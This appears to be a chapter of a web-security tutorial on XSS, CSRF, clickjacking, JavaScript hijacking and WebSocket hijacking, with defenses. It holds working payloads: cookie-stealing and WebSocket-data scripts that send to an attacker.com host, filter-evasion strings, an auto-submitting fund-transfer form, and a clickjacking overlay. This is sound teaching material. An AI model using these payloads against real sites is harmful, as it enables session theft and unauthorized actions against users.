# 05 — Cross-Site Scripting, CSRF & Client-Side Attacks

> These attacks weaponize the *victim's own browser* against them, or against a site they're already trusted by. They don't need to compromise the server at all — they exploit the trust relationship between a user's browser and the site it's talking to.

## Table of Contents
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [XSS Delivery Vectors](#xss-delivery-vectors)
- [Evading XSS Filters](#evading-xss-filters)
- [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
- [Clickjacking](#clickjacking)
- [JavaScript Hijacking](#javascript-hijacking)
- [Cross-Site WebSocket Hijacking](#cross-site-websocket-hijacking)
- [DOM-Based XSS Deep Dive](#dom-based-xss-deep-dive)
- [Defenses](#defenses)

---

## Cross-Site Scripting (XSS)

**Root cause:** the application includes untrusted input in an HTML page without properly encoding it, so the browser interprets attacker-supplied `<script>` (or event-handler) content as part of the page itself, executing it in the victim's session, under the target site's own origin.

### The Three Types of XSS

| Type | Where the payload lives | Persistence | Typical impact |
|---|---|---|---|
| **Reflected XSS** | Immediately echoed back from a request parameter into the response | One-time, requires the victim to click a crafted link | Session theft, credential phishing, one-off actions |
| **Stored XSS** | Saved server-side (comment, profile field, review) and served to every subsequent visitor | Persistent until removed from the datastore | Mass compromise — every visitor to that page is affected |
| **DOM-based XSS** | Payload never touches the server; a client-side script itself writes untrusted data into the DOM in a dangerous sink (`innerHTML`, `document.write`, `eval`) | Depends on the vulnerable client-side code | Can bypass server-side WAFs entirely, since the server never sees the payload in a "dangerous" form |

**Basic reflected XSS proof-of-concept:**
```
https://target.com/search?q=<script>alert(document.cookie)</script>
```

**Basic stored XSS proof-of-concept (submitted via a comment field):**
```html
<script>alert('XSS')</script>
```

**Session-theft payload (sends the victim's cookie to an attacker-controlled listener):**
```html
<script>
new Image().src = "https://attacker.com/collect?c=" + document.cookie;
</script>
```

### XSS Delivery Vectors

**Attack via email:**
```
1. Attacker crafts a link containing a malicious script and embeds it in an email:
   <A HREF="http://victimbank.com/registration.cgi?clientprofile=<SCRIPT>malicious code</SCRIPT>">Click here</A>
2. Victim, logged into victimbank.com, clicks the link.
3. The script runs in the context of victimbank.com and can read the session cookie,
   submit forms on the user's behalf, or redirect the page entirely.
```

**Attack via a crafted blog/forum post (stored XSS):**
The payload is submitted once (a blog comment, product review, forum signature) and then fires automatically for every subsequent visitor — no social engineering needed after the initial post.

**Attack in a comment field with filter-evasion:**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```
These avoid the literal string `<script>`, which is the first (and weakest) thing naive filters check for.

## Evading XSS Filters

Real-world filters are rarely airtight. Common bypass techniques:

**Encoding characters:**
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>     <!-- HTML entity encoding of 'alert' -->
<script>al\u0065rt(1)</script>                             <!-- unicode escape inside a string -->
```

**Manipulating tags/attributes:**
```html
<ScRiPt>alert(1)</sCrIpT>                 <!-- mixed case bypasses naive case-sensitive filters -->
<script >alert(1)</script >               <!-- extra whitespace -->
<scr<script>ipt>alert(1)</scr</script>ipt> <!-- nested tag, exploits naive single-pass stripping -->
```

**Introducing null bytes / breaking up the signature the filter looks for** so a filter that removes `<script>` in a single pass leaves behind a functional tag once its own removal logic is exploited (the nested-tag example above is one instance of this class).

## Cross-Site Request Forgery (CSRF)

**Root cause:** the browser automatically attaches cookies (including session cookies) to every request sent to the domain that issued them — *regardless of which page initiated the request*. If the target application relies solely on the presence of a valid session cookie to authorize an action (with no separate per-request proof that the user *intended* it), any page the victim's browser loads can silently trigger authenticated actions.

**How a CSRF attack unfolds:**
```
1. User logs into a trusted site (e.g., a stock-trading platform) and receives a session cookie.
2. User (still logged in) visits a malicious page — via a phishing email or a compromised ad network.
3. The malicious page auto-submits a form (or fires an image/fetch request) targeting the trusted site.
4. The victim's browser attaches the valid session cookie automatically.
5. The trusted server executes the request as if the victim intended it — e.g., transferring funds
   or buying stock — because from the server's perspective, it's a normal authenticated request.
```

**Auto-submitting form payload (hosted on the attacker's page):**
```html
<form action="https://bank.target.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to_account" value="ATTACKER_ACCOUNT" />
  <input type="hidden" name="amount" value="5000" />
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

**GET-based CSRF (even simpler — a single `<img>` tag is enough if the vulnerable action accepts GET):**
```html
<img src="https://shop.target.com/buy?symbol=MSFT&shares=1000" width="0" height="0" />
```

**Login CSRF** — a variant where the attacker forces the *victim's browser* to log into an account **the attacker controls**, then relies on the victim unknowingly submitting sensitive data (e.g., a payment card) into the attacker's account.

## Clickjacking

**Root cause:** the target page is loaded inside a transparent (or otherwise visually hidden) `<iframe>` and layered underneath the attacker's own decoy UI, so the victim believes they're clicking the decoy but their click actually lands on the hidden, legitimate page.

**Basic transparent-overlay payload:**
```html
<html>
<head>
  <style>
    iframe { position: absolute; top: 0; left: 0; width: 500px; height: 500px; opacity: 0.0001; z-index: 2; }
    .decoy { position: absolute; top: 0; left: 0; z-index: 1; }
  </style>
</head>
<body>
  <div class="decoy">
    <button>Click here to claim your prize!</button>
  </div>
  <iframe src="https://target.com/account/delete"></iframe>
</body>
</html>
```
Positioned precisely, the victim's click on the visible "Click here" button actually lands on the invisible "Delete Account" button underneath.

### Named Clickjacking Variants
- **Complete transparent overlay** — the legitimate page is fully transparent and overlaid on the attacker's decoy.
- **Cropping** — only a specific control from the target page is visible (via `clip`/`clip-path`), disguised with misleading surrounding text.
- **Hidden overlay / rapid content replacement** — the legitimate iframe is swapped in at the very last moment before the click registers, so the victim sees the decoy for almost the entire interaction.
- **Likejacking** — clickjacking specifically targeting social "Like"/"Share" buttons to spread a malicious page virally.
- **Cursorjacking** — the visible cursor is offset from the real cursor position via CSS, so a "safe-looking" click location actually clicks somewhere else entirely.

## JavaScript Hijacking

**Root cause:** an older technique targeting applications that used `<script src="...">` to load sensitive data formatted as a JSON array (this was common before proper `application/json` handling and CSRF-safe JSON prefixes became standard practice). Because `<script>` tags can be loaded cross-origin, an attacker page can override the `Array` constructor before including the victim's data feed, capturing the "JSON" values as they're constructed.

```html
<script>
function Array() {
  var obj = this;
  var index = 0;
  obj.__defineSetter__('length', function() {}); // intercept assignment
  // (illustrative — real payloads override element setters to capture each pushed value)
}
</script>
<script src="https://target.com/sensitive-data.json"></script>
```
**Modern defense:** never serve sensitive data as a bare top-level JSON array from a `GET`-accessible, unauthenticated-by-origin endpoint; require an unguessable anti-CSRF token; prefix JSON responses with a non-executable string (e.g. `)]}',`) that the legitimate client strips before parsing but that breaks naive `<script>`-tag inclusion.

## Cross-Site WebSocket Hijacking

**Root cause:** unlike normal AJAX requests, the WebSocket handshake (`Upgrade: websocket`) is **not** subject to the Same-Origin Policy or CORS by default — the browser will happily let a page on `attacker.com` open a WebSocket connection to `target.com`, and if the server only relies on cookies for authentication (without validating the `Origin` header during the handshake), the attacker's page inherits the victim's authenticated WebSocket session.

**Proof-of-concept (run from an attacker-controlled page while the victim is logged into target.com):**
```html
<script>
var ws = new WebSocket("wss://target.com/chat");
ws.onmessage = function(event) {
  fetch("https://attacker.com/collect", { method: "POST", body: event.data });
};
</script>
```

**Defenses:** validate the `Origin` header on every WebSocket handshake server-side against an allow-list, require a separate anti-CSRF-style token in the handshake (not just the session cookie), and treat WebSocket endpoints with the same authentication rigor as any other authenticated API.

## DOM-Based XSS Deep Dive

Unlike reflected/stored XSS, the vulnerable code path here is entirely client-side JavaScript reading attacker-controllable browser state (URL, `location.hash`, `document.referrer`, `window.name`) and writing it into a dangerous "sink" without sanitization.

**Vulnerable pattern:**
```javascript
// Reads directly from the URL fragment (never sent to the server, so server-side
// filtering/WAFs can't see or block this payload at all)
var name = location.hash.substring(1);
document.getElementById('greeting').innerHTML = "Hello, " + name;
```
**Exploitation:**
```
https://target.com/welcome#<img src=x onerror=alert(document.cookie)>
```
**Dangerous sinks to audit for in any JS codebase:** `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `setInterval(string)`, `Function(string)`, `element.setAttribute('on...', ...)`, `location = untrustedInput`.

**Related client-side risks worth testing alongside DOM XSS:**
- **HTML5 attacks** — abusing `postMessage` without origin validation, insecure use of `localStorage`/`sessionStorage` for sensitive tokens (readable by any script on the page, including an injected XSS payload), Web Worker/Service Worker abuse.
- **Frame injection** — an attacker-controlled iframe embedded within a legitimate page tricks the user into interacting with attacker content while the address bar still shows the trusted domain.

## Defenses

| Attack | Primary Defense |
|---|---|
| XSS (all types) | Context-aware output encoding (HTML entity, JS string, URL encoding as appropriate), Content-Security-Policy (`script-src 'self'`), `HttpOnly` + `Secure` cookies, input validation as defense-in-depth (not a substitute for output encoding) |
| CSRF | Synchronizer (anti-CSRF) tokens on every state-changing request, `SameSite=Lax/Strict` cookies, re-authentication for high-value actions, checking the `Origin`/`Referer` header |
| Clickjacking | `X-Frame-Options: DENY` or `SAMEORIGIN`, CSP `frame-ancestors` directive, frame-busting JS as a defense-in-depth fallback only |
| JavaScript Hijacking | Never expose sensitive data as a bare top-level JSON array; require authentication tokens beyond cookies for data-feed endpoints |
| Cross-Site WebSocket Hijacking | Validate `Origin` on the WebSocket handshake; use a dedicated auth token in the handshake |
| DOM-based XSS | Avoid dangerous sinks; when unavoidable, sanitize with a vetted library (DOMPurify); prefer `textContent` over `innerHTML` |

Full countermeasure detail (including exact CSP examples and secure cookie flags) is in [10 — Countermeasures & Secure Coding](./10-countermeasures-and-secure-coding.md).

---

**Previous:** [← 04 — Injection Attacks](./04-injection-attacks.md) · **Next:** [06 — Session, Authentication & Authorization Attacks →](./06-session-authentication-and-authorization-attacks.md)
